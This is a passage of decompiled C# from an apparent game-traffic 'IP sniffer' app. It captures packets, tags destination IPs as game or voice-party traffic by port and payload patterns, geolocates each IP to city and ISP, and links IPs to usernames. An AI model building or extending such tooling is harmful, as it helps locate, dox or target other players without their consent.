				arpbw.RunWorkerAsync();
			}
			BackgroundWorker backgroundWorker = new BackgroundWorker();
			backgroundWorker.DoWork += GridThread;
			backgroundWorker.RunWorkerAsync();
			communicator.ReceivePackets(0, PacketHandler);
		}
		catch (Exception)
		{
		}
	}

	private void PacketHandler(Packet packet)
	{
		if (exitRequest)
		{
			mainThread.Abort();
		}
		else
		{
			if (!PacketFilter(packet))
			{
				return;
			}
			IpV4Datagram ipV4 = packet.Ethernet?.IpV4;
			if (ipV4 != null)
			{
				if (!_packets.ContainsKey(ipV4.Destination.ToString()))
				{
					_packets[ipV4.Destination.ToString()] = new List<Packet>();
				}
				if (_packets[ipV4.Destination.ToString()].Count >= 10)
				{
					IEnumerable<Packet> newEntry = _packets[ipV4.Destination.ToString()].Skip(1);
					_packets[ipV4.Destination.ToString()] = newEntry.ToList();
				}
				_packets[ipV4.Destination.ToString()] = _packets[ipV4.Destination.ToString()].Append(packet).ToList();
				ProcessPacket(packet);
			}
		}
	}

	private bool PacketFilter(Packet packet)
	{
		foreach (IPacketFilter packetFilter in PluginLoader._packetFilters)
		{
			if (packetFilter.ShouldFilter(packet))
			{
				return false;
			}
		}
		return true;
	}

	public static bool IsPrivateIp(string ipAddress)
	{
		if (!IPAddress.TryParse(ipAddress, out var ip))
		{
			throw new ArgumentException("Invalid IP address format.");
		}
		byte[] ipBytes = ip.GetAddressBytes();
		if (!IsInRange(ipBytes, new byte[4] { 10, 0, 0, 0 }, new byte[4] { 10, 255, 255, 255 }) && !IsInRange(ipBytes, new byte[4] { 172, 16, 0, 0 }, new byte[4] { 172, 31, 255, 255 }))
		{
			return IsInRange(ipBytes, new byte[4] { 192, 168, 0, 0 }, new byte[4] { 192, 168, 255, 255 });
		}
		return true;
	}

	private static bool IsInRange(byte[] ipBytes, byte[] startBytes, byte[] endBytes)
	{
		for (int i = 0; i < 4; i++)
		{
			if (ipBytes[i] < startBytes[i] || ipBytes[i] > endBytes[i])
			{
				return false;
			}
		}
		return true;
	}

	private async Task ProcessPacket(Packet packet)
	{
		SettingsModel settings = SettingsManager.Load();
		ListObject listObject = new ListObject
		{
			IPAddress = packet.Ethernet.IpV4.Destination.ToString(),
			Port = packet.Ethernet.IpV4.GetPacketDestinationPort().ToString()
		};
		string[] ipInfo = await new IPLocator().IPLocationAsync(listObject.IPAddress);
		string city = ipInfo[0];
		string region = ipInfo[1];
		string country = ipInfo[2];
		string isp = ipInfo[3];
		bool.Parse(ipInfo[4]);
		string ipAddress = listObject.IPAddress;
		listObject.ISP = isp;
		listObject.Country = country;
		listObject.Region = region;
		listObject.City = city;
		if (ipAddress.StartsWith("0") || filteredIPs.Contains(ipAddress) || privateIpRanges.Contains(ipAddress) || IsPrivateIp(ipAddress) || Filterips.Any((string x) => isp.StartsWith(x)))
		{
			return;
		}
		string filter = GetGameFilter(packet).FirstOrDefault((string x) => settings.EnabledFilters.Contains(x));
		listObject.Gamefilter = filter;
		bool num = settings.EnabledFilters.Contains(listObject.Gamefilter);
		HashSet<string> obj = new HashSet<string>
		{
			"50000", "55000", "23156", "40003", "40007", "1620", "3724", "8614", "8755", "4757",
			"1554", "16382", "33712", "11598", "443", "1119", "3075", "3544", "53", "22",
			"5353", "38298", "80", "2408", "2048", "138", "53343", "8081", "7070", "1054",
			"44048", "41631", "52303", "6487", "9115", "38298", "56132", "21567", "13544", "3435",
			"9127", "41299", "50209", "24593", "17582", "26695", "38619", "48862", "7680", "475",
			"39", "999", "4070", "6911", "666", "10000", "1400", "596"
		};
		guna2DataGridView3.Invoke((Action)delegate
		{
			AddToGridUnfiltered(null, new DoWorkEventArgs(listObject));
		});
		bool isPortBlocked = obj.Contains(listObject.Port);
		if (num && !isPortBlocked)
		{
			dataGridView1.Invoke((Action)delegate
			{
				AddToGrid(null, new DoWorkEventArgs(listObject));
			});
			guna2DataGridView5.Invoke((Action)delegate
			{
				AddToGridPsn(null, new DoWorkEventArgs(listObject));
			});
			Pcdecryption.Invoke((Action)delegate
			{
				AddToGridPc(null, new DoWorkEventArgs(listObject));
			});
			await AddGeolocationData(listObject);
		}
	}

	private IEnumerable<byte> ConvertHexToBytes(string hexString)
	{
		string[] array = hexString.Split(' ');
		List<byte> bytes = new List<byte>();
		string[] array2 = array;
		foreach (string hex in array2)
		{
			bytes.Add(Convert.ToByte(hex, 16));
		}
		return bytes;
	}

	private string[] GetGameFilter(Packet packet)
	{
		string ipAddress = packet.Ethernet.IpV4.Destination.ToString();
		IpV4Datagram ipv4Packet = packet.Ethernet.IpV4;
		int port = packet.Ethernet.IpV4.GetPacketDestinationPort();
		UdpDatagram udpPacket = packet.Ethernet.IpV4.Udp;
		_ = packet.Ethernet.IpV4.Tcp;
		byte[] payload = null;
		List<string> filters = new List<string>();
		if (packet.Ethernet.IpV4.Udp != null)
		{
			payload = packet.Ethernet.IpV4.Udp.Payload.ToArray();
		}
		else if (packet.Ethernet.IpV4.Tcp != null)
		{
			payload = packet.Ethernet.IpV4.Tcp.Payload.ToArray();
		}
		if (ipAddress.StartsWith("128."))
		{
			filters.Add("Roblox (Server)");
		}
		if (port == 30120)
		{
			filters.Add("FiveM (Server)");
		}
		if (port == 6672 && udpPacket != null && udpPacket.Length >= 400 && ipv4Packet.TotalLength >= 350)
		{
			filters.Add("Gta Nearest (Client)");
		}
		if (port == 6672 && udpPacket != null && udpPacket.Length >= 200 && ipv4Packet?.TotalLength > 427 && 470 > ipv4Packet?.TotalLength)
		{
			filters.Add("GTA Orb (Client)");
		}
		if (port >= 50000 && port <= 50100)
		{
			filters.Add("Discord (Server)");
		}
		if (udpPacket != null)
		{
			IEnumerable<byte> ufcPayload = ConvertHexToBytes("60 00 00 00 00 a4");
			if (payload.Contains(ufcPayload) && 311 > payload.Length && payload.Length > 100)
			{
				filters.Add("UFC (Client)");
			}
			IEnumerable<byte> fridayPayload = ConvertHexToBytes("0c 02");
			if (payload.Contains(fridayPayload) && 311 > payload.Length && payload.Length > 100)
			{
				filters.Add("Friday 13th (Host)");
			}
		}
		if (port >= 46000 && port <= 65535)
		{
			filters.Add("Psn Party (Client)");
		}
		if (Overwatch2ServerRegex.IsMatch(ipAddress))
		{
			filters.Add("Overwatch (Server)");
		}
		if (TMobileClientRegex.IsMatch(ipAddress))
		{
			filters.Add("T-Mobile (Client)");
		}
		if (port == 19132)
		{
			filters.Add("Minecraft (Server)");
		}
		if (port == 2313)
		{
			filters.Add("AnyDesk (Client)");
		}
		if (port >= 32000 && port <= 32300)
		{
			filters.Add("Telegram (Server)");
		}
		if (port >= 20040 && port <= 20199)
		{
			IEnumerable<byte> h1z1Payload = ConvertHexToBytes("00 15");
			if (payload.Contains(h1z1Payload))
			{
				filters.Add("H1Z1 (Server)");
			}
		}
		if (Overwatch2ServerRegex.IsMatch(ipAddress))
		{
			filters.Add("Overwatch (Server");
		}
		if (XboxPartyServerRegex.IsMatch(ipAddress))
		{
			filters.Add("Xbox Party (Server");
		}
		if (port >= 27000 && port <= 45000)
		{
			filters.AddRange(GetGameFiltersForPortRange27000To45000());
		}
		if (port >= 30000 && port <= 31000)
		{
			filters.Add("Sea Of Thieves (Server)");
		}
		if (port == 3074)
		{
			filters.AddRange(GetGameFiltersForPort3074());
		}
		if (port >= 7000 && port <= 8000)
		{
			filters.AddRange(GetGameFiltersForPort7000To9100());
		}
		if (port >= 9000 && port <= 9100)
		{
			filters.Add("Fortnite (Server)");
		}
		if (port == 6672)
		{
			filters.AddRange(GetGameFiltersForPort6672());
		}
		if (port == 3478)
		{
			filters.Add("Psn Party (Server)");
		}
		if (port == 5056)
		{
			filters.Add("VrChat (Server)");
		}
		if (port >= 3000 && port <= 5000)
		{
			filters.AddRange(GetGameFiltersForPort3000To5000());
		}
		if (port >= 20000 && port <= 25000)
		{
			filters.AddRange(GetGameFiltersForPort20000To25000());
		}
		if (port >= 10000 && port <= 11000)
		{
			filters.Add("Dayz (Server)");
		}
		if (port >= 3744 && port <= 4500)
		{
			filters.Add("Among Us (Server)");
		}
		if (port >= 10000 && port <= 10999)
		{
			filters.Add("Battlefield (Server)");
		}
		if (port >= 14000 && port <= 15000)
		{
			filters.Add("Far Cry 6 (Server)");
		}
		foreach (Filter filter in Filters)
		{
			foreach (FilterOption option in filter.Options)
			{
				if (IsPortInRange(option.Ports, port) && IsPayloadMatching(option.Payloads, payload) && IsLengthValid(option, payload.Length))
				{
					filters.Add(filter.Name);
				}
			}
		}
		if (filters.Count == 0)
		{
			filters.Add("Unknown Game (Server)");
		}
		return filters.ToArray();
	}

	private string[] GetGameFiltersForPortRange27000To45000()
	{
		return new string[9] { "Csgo (Server)", "Terraria (Server)", "Splitgate (Server)", "Call of Duty® (Server)", "R6 (Server)", "Combatmaster (Server)", "Rust (Server)", "Apex (Server)", "Garrysmod (Server)" };
	}

	private string[] GetGameFiltersForPort3074()
	{
		return new string[3] { "MW2 (Client)", "Xbox (Client)", "BO3 (Client)" };
	}

	private string[] GetGameFiltersForPort7000To9100()
	{
		return new string[3] { "The Finals (Server)", "Rocket League (Server)", "Valorant (Server)" };
	}

	private string[] GetGameFiltersForPort6672()
	{
		return new string[2] { "RDR (Client)", "GTA V (Client)" };
	}

	private string[] GetGameFiltersForPort3000To5000()
	{
		return new string[2] { "WatchDogs (Client)", "Warframe (Client)" };
	}

	private string[] GetGameFiltersForPort20000To25000()
	{
		return new string[1] { "FIFA (Server)" };
	}

	private async Task AddGeolocationData(ListObject listObject)
	{
		string ipAddress = listObject.IPAddress;
		try
		{
			HttpClient client = new HttpClient();
			try
			{
				await new IPLocator().IPLocationAsync(ipAddress);
				if (Global.GeoCacheManage.TryGetCachedResponse(ipAddress, out var val))
				{
					if (Global.FlagCacheManage.TryGetCachedResponse(val.CountryCode, out var flagBytes))
					{
						using (Stream imageStream = new MemoryStream(flagBytes))
						{
							listObject.Flag = Image.FromStream(imageStream);
						}
						Global.FlagCacheManage.CacheResponse(val.CountryCode, flagBytes);
					}
					else
					{
						if (string.IsNullOrEmpty(val.CountryCode))
						{
							return;
						}
						string flagUrl = "https://flagsapi.com/" + val.CountryCode + "/shiny/16.png";
						HttpResponseMessage imageResponse = await client.GetAsync(flagUrl);
						try
						{
							imageResponse.EnsureSuccessStatusCode();
							byte[] bytes = await imageResponse.Content.ReadAsByteArrayAsync();
							using (Stream imageStream2 = new MemoryStream(bytes))
							{
								listObject.Flag = Image.FromStream(imageStream2);
							}
							Global.FlagCacheManage.CacheResponse(val.CountryCode, bytes);
						}
						finally
						{
							((IDisposable)imageResponse)?.Dispose();
						}
						return;
					}
				}
				else
				{
					Console.WriteLine("Cache Find Fail");
				}
			}
			finally
			{
				((IDisposable)client)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Failed to fetch geolocation data: " + ex.Message);
		}
	}

	private async void AddToGridUnfiltered(object sender, DoWorkEventArgs e)
	{
		object argument = e.Argument;
		if (!(argument is ListObject listObject) || _cancellationTokenSource.IsCancellationRequested || processedIPsUnfiltered.Contains(listObject.IPAddress))
		{
			return;
		}
		if (isProcessingIP)
		{
			ipQueue.Enqueue(listObject);
			return;
		}
		isProcessingIP = true;
		try
		{
			if (blockedISPs.Contains(listObject.ISP))
			{
				Console.WriteLine("Blocked ISP detected: " + listObject.ISP);
				return;
			}
			string[] ipInfo = await new IPLocator().IPLocationAsync(listObject.IPAddress);
			string city = ipInfo[0];
			string region = ipInfo[1];
			string country = ipInfo[2];
			string isp = ipInfo[3];
			bool hosting = bool.Parse(ipInfo[4]);
			if (Filterips.Any((string x) => isp.StartsWith(x)))
			{
				return;
			}
			await AddGeolocationData(listObject);
			if (!IsIPAlreadyAdded(guna2DataGridView3, listObject.IPAddress))
			{
				string username = IPLocator.LookupUsernameAsync(listObject.IPAddress);
				if (!string.IsNullOrEmpty(username))
				{
					listObject.Username = username;
				}
				GeolocationResponse ipinfo = new GeolocationResponse
				{
					City = city,
					Region = region,
					country_name = country,
					Isp = isp,
					Hosting = hosting
				};
				UpdateGrid(guna2DataGridView3, listObject, ipinfo);
			}
			processedIPsUnfiltered.Add(listObject.IPAddress);
		}
		catch (OperationCanceledException)
		{
			Console.WriteLine("Operation was canceled.");
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error fetching geolocation for " + listObject.IPAddress + ": " + ex2.Message);
		}
		finally
		{
			isProcessingIP = false;
			if (ipQueue.Count > 0)
			{
				ListObject nextListObject = ipQueue.Dequeue();
				AddToGridUnfiltered(sender, new DoWorkEventArgs(nextListObject));
			}
		}
	}

	private void UpdateGrid(Guna2DataGridView grid, ListObject listObject, GeolocationResponse ipinfo)
	{
		if (grid.InvokeRequired)
		{
			grid.Invoke((Action)delegate
			{
				grid.Rows.Add(listObject.Flag, listObject.Username, listObject.IPAddress, listObject.Port, ipinfo?.country_name, ipinfo?.Region, ipinfo?.City, ipinfo?.Isp, listObject.InPackets, listObject.OutPackets);
			});
		}
		else
		{
			grid.Rows.Add(listObject.Flag, listObject.Username, listObject.IPAddress, listObject.Port, ipinfo?.country_name, ipinfo?.Region, ipinfo?.City, ipinfo?.Isp, listObject.InPackets, listObject.OutPackets);
		}
	}

	public void StopSniffing()
	{
		_cancellationTokenSource.Cancel();
	}

	public void StartSniffing()
	{
		_cancellationTokenSource = new CancellationTokenSource();
	}

	private async void AddToGridPsn(object sender, DoWorkEventArgs e)
	{
		object argument = e.Argument;
		if (!(argument is ListObject listObject) || psnfilter.Contains(listObject.IPAddress) || listObject.IPAddress.StartsWith("66.22.") || processedIPs.Contains(listObject.IPAddress))
		{
			return;
		}
		if (isProcessing)
		{
			ipQueue1.Enqueue(listObject);
			return;
		}
		isProcessing = true;
		try
		{
			if (blockedISPs.Contains(listObject.ISP))
			{
				Console.WriteLine("Blocked ISP detected: " + listObject.ISP);
				return;
			}
			string[] ipInfo = await new IPLocator().IPLocationAsync(listObject.IPAddress);
			string city = ipInfo[0];
			string region = ipInfo[1];
			string country = ipInfo[2];
			string isp = ipInfo[3];
			bool hosting = bool.Parse(ipInfo[4]);
			if (Filterips.Any((string x) => isp.StartsWith(x)))
			{
				return;
			}
			await AddGeolocationData(listObject);
			_ = city == "";
			if (blockedISPs.Contains(isp))
			{
				Console.WriteLine("Blocked ISP detected from geolocation: " + isp);
				return;
			}
			int port = int.Parse(listObject.Port);
			if ((port < 20000 || port > 65535) && !filteredPorts.Contains(listObject.Port) && !additionalPorts.Contains(listObject.Port))
			{
				return;
			}
			if (!IsIPAlreadyAdded(guna2DataGridView5, listObject.IPAddress))
			{
				string username = IPLocator.LookupUsernameAsync(listObject.IPAddress);
				if (!string.IsNullOrEmpty(username))
				{
					listObject.Username = username;
				}
				GeolocationResponse ipinfo = new GeolocationResponse
				{
					City = city,
					Region = region,
					country_name = country,
					Isp = isp,
					Hosting = hosting
				};
				UpdateGrid(guna2DataGridView5, listObject, ipinfo);
			}
			processedIPs.Add(listObject.IPAddress);
		}
		catch (OperationCanceledException)
		{
			Console.WriteLine("Operation was canceled.");
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error fetching geolocation for " + listObject.IPAddress + ": " + ex2.Message);
		}
		finally
		{
			isProcessing = false;
			if (ipQueue1.Count > 0)
			{
				ListObject nextListObject = ipQueue1.Dequeue();
				AddToGridPsn(sender, new DoWorkEventArgs(nextListObject));
			}
		}
	}

	private async void AddToGridPc(object sender, DoWorkEventArgs e)
	{
		object argument = e.Argument;
		if (!(argument is ListObject listObject) || Pcinfohash.Contains(listObject.IPAddress) || listObject.IPAddress.StartsWith("66.22.") || processedIPsPC.Contains(listObject.IPAddress) || !(listObject.Port == "6672"))
		{
			return;
		}
		if (isProcessingPC)
		{
			ipQueue1.Enqueue(listObject);
			return;
		}
		isProcessingPC = true;
		try
		{
			if (blockedISPs.Contains(listObject.ISP))
			{
				Console.WriteLine("Blocked ISP detected: " + listObject.ISP);
				return;
			}
			string[] ipInfo = await new IPLocator().IPLocationAsync(listObject.IPAddress);
			string city = ipInfo[0];
			string region = ipInfo[1];
			string country = ipInfo[2];
			string isp = ipInfo[3];
			bool hosting = bool.Parse(ipInfo[4]);
			if (Filterips.Any((string x) => isp.StartsWith(x)))
			{
				return;
			}
			await AddGeolocationData(listObject);
			if (blockedISPs.Contains(isp))
			{
				Console.WriteLine("Blocked ISP detected from geolocation: " + isp);
				return;
			}
			if (!IsIPAlreadyAdded(Pcdecryption, listObject.IPAddress))
			{
				string username = IPLocator.LookupUsernameAsync(listObject.IPAddress);
				if (!string.IsNullOrEmpty(username))
				{
					listObject.Username = username;
				}
				GeolocationResponse ipinfo = new GeolocationResponse
				{
					City = city,
					Region = region,
					country_name = country,
					Isp = isp,
					Hosting = hosting
				};
				UpdateGrid(Pcdecryption, listObject, ipinfo);
			}
			processedIPsPC.Add(listObject.IPAddress);
		}
		catch (OperationCanceledException)
		{
			Console.WriteLine("Operation was canceled.");
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error fetching geolocation for " + listObject.IPAddress + ": " + ex2.Message);
		}
		finally
		{
			isProcessingPC = false;
			if (ipQueue1.Count > 0)
			{
				ListObject nextListObject = ipQueue1.Dequeue();
				AddToGridPc(sender, new DoWorkEventArgs(nextListObject));
			}
		}
	}

	private bool IsIPAlreadyAdded(Guna2DataGridView grid, string ipAddress)
	{
		foreach (DataGridViewRow row in (IEnumerable)grid.Rows)
		{
			if (row.Cells[1].Value != null && row.Cells[1].Value.ToString() == ipAddress)
			{
				return true;
			}
		}
		return false;
	}

	private void SetDS(BindingList<ListObject> list)
	{
		if (!dataGridView1.InvokeRequired)
		{
			dataGridView1.RowTemplate.Height = 35;
			dataGridView1.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.None;
			dataGridView1.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
			dataGridView1.DataSource = null;
			dataGridView1.DataSource = list;
			dataGridView1.DataSource = null;
			dataGridView1.DataSource = list;
			dataGridView1.Columns["Flag"].HeaderText = "";
			dataGridView1.Columns["Flag"].Width = 20;
			dataGridView1.Columns["Flag"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["Username"].HeaderText = "Label";
			dataGridView1.Columns["Username"].Width = 90;
			dataGridView1.Columns["Username"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["Gamefilter"].HeaderText = "Filter Name";
			dataGridView1.Columns["Gamefilter"].Width = 110;
			dataGridView1.Columns["Gamefilter"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["IPAddress"].HeaderText = "IP Address";
			dataGridView1.Columns["IPAddress"].Width = 100;
			dataGridView1.Columns["IPAddress"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["Port"].HeaderText = "Port";
			dataGridView1.Columns["Port"].Width = 50;
			dataGridView1.Columns["Port"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["Country"].HeaderText = "Country";
			dataGridView1.Columns["Country"].Width = 90;
			dataGridView1.Columns["Country"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["Region"].HeaderText = "Region";
			dataGridView1.Columns["Region"].Width = 80;
			dataGridView1.Columns["Region"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["City"].HeaderText = "City";
			dataGridView1.Columns["City"].Width = 80;
			dataGridView1.Columns["City"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["ISP"].HeaderText = "ISP";
			dataGridView1.Columns["ISP"].Width = 200;
			dataGridView1.Columns["ISP"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["OutPackets"].HeaderText = "▲";
			dataGridView1.Columns["OutPackets"].Width = 40;
			dataGridView1.Columns["OutPackets"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["InPackets"].HeaderText = "▼";
			dataGridView1.Columns["InPackets"].Width = 40;
			dataGridView1.Columns["InPackets"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["ProtectionIcon"].HeaderText = "";
			dataGridView1.Columns["ProtectionIcon"].Width = 20;
			dataGridView1.Columns["ProtectionIcon"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["Protected"].Visible = false;
			dataGridView1.Columns["IsInbound"].HeaderText = "";
			dataGridView1.Columns["IsInbound"].Visible = false;
			dataGridView1.Columns["IsInbound"].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
			dataGridView1.Columns["Protected"].Visible = false;
			dataGridView1.AllowUserToAddRows = false;
		}
		else
		{
			SetDSCallback setDSCallback = SetDS;
			object[] objArray = new object[1] { list };
			Invoke(setDSCallback, objArray);
		}
	}

	private void SetText2(string text)
	{
		if (exitRequest)
		{
			Thread.CurrentThread.Abort();
			return;
		}
		if (!logInNormalTextBox2.InvokeRequired)
		{
			logInNormalTextBox2.Text = text;
			return;
		}
		SetText2Callback setText2Callback = SetText2;
		object[] objArray = new object[1] { text };
		Invoke(setText2Callback, objArray);
	}

	private void ShowGroup5()
	{
		try
		{
			if (!logInGroupBox2.InvokeRequired)
			{
				logInGroupBox2.Show();
			}
			else
			{
				Invoke(new ShowGroup5Callback(ShowGroup5));
			}
		}
		catch
		{
		}
	}

	private string logInNormalTextBox1Text()
	{
		try
		{
			if (!logInNormalTextBox1.InvokeRequired)
			{
				return logInNormalTextBox1.Text;
			}
			logInNormalTextBox1TextCallback logInNormalTextBox1TextCallback = logInNormalTextBox1Text;
			return (string)Invoke(logInNormalTextBox1TextCallback);
		}
		catch
		{
			return "";
		}
	}

	private string logInNormalTextBox2Text()
	{
		try
		{
			if (!logInNormalTextBox2.InvokeRequired)
			{
				return logInNormalTextBox2.Text;
			}
			logInNormalTextBox2TextCallback logInNormalTextBox2TextCallback = logInNormalTextBox2Text;
			return (string)Invoke(logInNormalTextBox2TextCallback);
		}
		catch
		{
			return "";
		}
	}

	private string logInNormalTextBox3Text()
	{
		try
		{
			if (!asdasd.InvokeRequired)
			{
				return asdasd.Text;
			}
			TextBox4TextCallback textBox4TextCallback = logInNormalTextBox3Text;
			return (string)Invoke(textBox4TextCallback);
		}
		catch
		{
			return "";
		}
	}

	private string logInNormalTextBox4Text()
	{
		try
		{
			if (!logInNormalTextBox4.InvokeRequired)
			{
				return logInNormalTextBox4.Text;
			}
			logInNormalTextBox4TextCallback logInNormalTextBox4TextCallback = logInNormalTextBox4Text;
			return (string)Invoke(logInNormalTextBox4TextCallback);
		}
		catch
		{
			return "";
		}
	}

	private void UpdateLocations(object sender, DoWorkEventArgs e)
	{
		if (dataGridView1.Columns.Count >= 10)
		{
			string[] columnHeaders = new string[12]
			{
				"", "", "Label", "Filter Name", "IP Address", "Country", "Region", "City", "ISP", "",
				"▼", "▲"
			};
			for (int i = 0; i < columnHeaders.Length; i++)
			{
				dataGridView1.Columns[i].HeaderText = columnHeaders[i];
			}
		}
		while (running)
		{
			foreach (ListObject item in new List<ListObject>(list))
			{
				try
				{
					if (!ShouldUpdateDataGridView(item))
					{
						continue;
					}
					UpdateLocationInfo(item);
					try
					{
						string userInfos = IPLocator.LookupUsernameAsync(item.IPAddress);
						if (!string.IsNullOrEmpty(userInfos))
						{
							item.Username = userInfos;
							UpdateUsernameInDataGridView(dataGridView1, item.IPAddress, userInfos, "Username");
							UpdateUsernameInDataGridView(guna2DataGridView3, item.IPAddress, userInfos, "Column1");
							UpdateUsernameInDataGridView(guna2DataGridView5, item.IPAddress, userInfos, "DataGridViewTextBoxColumn1");
						}
					}
					catch (Exception ex)
					{
						Console.WriteLine("An error occurred: " + ex.Message);
					}
				}
				catch (Exception ex2)
				{
					Console.WriteLine("An error occurred: " + ex2.Message);
				}
			}
		}
	}

	public void UpdateUsernameInDataGridView(DataGridView gridView, string ipAddress, string username, string columnName)
	{
		foreach (DataGridViewRow row in (IEnumerable)gridView.Rows)
		{
			if (row.Cells["IPAddress"].Value?.ToString() == ipAddress)
			{
				row.Cells[columnName].Value = username;
			}
		}
	}

	private async void UpdateLocationInfo(ListObject item)
	{
		try
		{
			string[] locationInfo = await new IPLocator().IPLocationAsync(item.IPAddress.ToString());
			item.Country = locationInfo[2];
			item.Region = locationInfo[1];
			item.City = locationInfo[0];
			item.ISP = locationInfo[3];
			if (blockedISPs.Contains(item.ISP))
			{
				Console.WriteLine("Blocked ISP detected: " + item.ISP);
			}
			else
			{
				if (!bool.TryParse(locationInfo[4], out var protectedValue))
				{
					return;
				}
				item.Protected = protectedValue;
				if (companyIconMapping.ContainsKey(item.ISP))
				{
					string iconPath = companyIconMapping[item.ISP];
					try
					{
						item.ProtectionIcon = Image.FromFile(iconPath);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error loading icon: " + ex.Message);
					}
				}
				else
				{
					string defaultIconPath = "unlock.png";
					try
					{
						item.ProtectionIcon = Image.FromFile(defaultIconPath);
					}
					catch (Exception ex2)
					{
						Console.WriteLine("Error loading default icon: " + ex2.Message);
					}
				}
				UpdateDataGridViewRowWithIcon(item);
			}
		}
		catch (Exception ex3)
		{
			Console.WriteLine("An error occurred: " + ex3.Message);
		}
	}

	private void UpdateDataGridViewRowWithIcon(ListObject item)
	{
		int rowIndex = list.IndexOf(item);
		if (rowIndex != -1 && rowIndex < dataGridView1.Rows.Count)
		{
			try
			{
				dataGridView1.Rows[rowIndex].Cells["ProtectionIcon"].Value = item.ProtectionIcon;
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error updating DataGridView row with icon: " + ex.Message);
			}
		}
	}

	private bool ShouldUpdateDataGridView(ListObject item)
	{
		if (item.Country != null && !item.Country.Contains("Reserved") && item.Region != null && !item.Region.Contains("Reserved") && item.City != null && !item.City.Contains("Reserved") && item.ISP != null && !item.ISP.Contains("Reserved"))
		{
			return item.Protected == item.Protected;
		}
		return true;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Global.FlagCacheManage?.SaveCacheToFile();
	}

	private void copySourceIPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView1.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = dataGridView1.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string obj = selectedRow.Cells[5].Value.ToString();
				string cellValue2 = selectedRow.Cells[6].Value.ToString();
				Clipboard.SetText(obj + " " + cellValue2);
			}
			else
			{
				Alert("The selected row does not have enough cells.", alert.enmType.Success);
			}
		}
	}

	private void logInButton2_Click(object sender, EventArgs e)
	{
	}

	private void LoadSettings()
	{
		if (SettingsManager.Load().ShowDiscordRPC)
		{
			Globals.SetRPC(showDiscordRPC: true);
			Globals.UpdateRichPresence("", "Status: Idle");
		}
		else
		{
			Globals.SetRPC(showDiscordRPC: false);
		}
	}

	private void ApplyBackgroundColor()
	{
		string savedColor = SNIFF.Properties.Settings.Default.BackgroundColor;
		if (!string.IsNullOrEmpty(savedColor))
		{
			try
			{
				Color color = ColorTranslator.FromHtml(savedColor);
				guna2TabControl1.TabMenuBackColor = color;
				guna2GroupBox3.CustomBorderColor = color;
				guna2Button5.FillColor = color;
				guna2Button3.FillColor = color;
				guna2Button9.FillColor = color;
				guna2Button8.FillColor = color;
				guna2TextBox2.FillColor = color;
				guna2TextBox5.FillColor = color;
				SniffBTN.FillColor = color;
				guna2CircleButton3.FillColor = color;
				guna2CircleButton1.FillColor = color;
				guna2CircleButton2.FillColor = color;
				panel3.BackColor = color;
				txtRowCount.BackColor = color;
				label6.BackColor = color;
				panel2.BackColor = color;
				guna2ComboBox1.FillColor = color;
				guna2ComboBox1.BackColor = color;
				guna2TextBox4.BackColor = color;
				guna2TextBox3.BackColor = color;
				guna2TextBox4.FillColor = color;
				guna2TextBox3.FillColor = color;
			}
			catch (Exception ex)
			{
				Alert("Error applying background color: " + ex.Message, alert.enmType.Warning);
			}
		}
	}

	public static bool ValidateIP(string value)
	{
		value = value.Trim();
		return new Regex("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$").IsMatch(value);
	}

	private void SetComboBoxText()
	{
		try
		{
			SettingsModel settings = SettingsManager.Load();
			guna2ComboBox1.Text = settings.Adapter.ToString();
		}
		catch (NullReferenceException ex)
		{
			ShowNotification("Adapter is not set.");
			Console.WriteLine("Error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			ShowNotification("An unexpected error occurred.");
			Console.WriteLine("Error: " + ex2.Message);
		}
	}

	private void guna2Panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void SetTabs()
	{
	}

	private void ShowNotification(string message)
	{
		if (notification == null || notification.IsDisposed)
		{
			notification = new NotificationForm();
			notification.SetMessage(message);
			notification.StartPosition = FormStartPosition.Manual;
			notification.Owner = this;
			notification.TopMost = true;
		}
		else
		{
			notification.SetMessage(message);
		}
		UpdateNotificationPosition();
		notification.Show();
		timer2.Start();
	}

	private void UpdateNotificationPosition()
	{
		if (notification != null && !notification.IsDisposed)
		{
			int notificationWidth = notification.Width;
			int notificationHeight = notification.Height;
			int x = base.ClientSize.Width - notificationWidth - 10;
			int y = base.ClientSize.Height - notificationHeight - 10;
			notification.Location = new Point(base.Left + x, base.Top + y);
		}
	}

	private void guna2CircleButton2_Click(object sender, EventArgs e)
	{
		t menu = new t();
		menu.StartPosition = FormStartPosition.Manual;
		menu.Location = new Point(base.Location.X + (base.Width - menu.Width) / 2, base.Location.Y + (base.Height - menu.Height) / 2);
		menu.ShowDialog(this);
		SetTabs();
		base.Enabled = true;
	}

	public void Alert(string msg, alert.enmType type)
	{
		new alert().showAlert(msg, type);
	}

	private void label6_Click(object sender, EventArgs e)
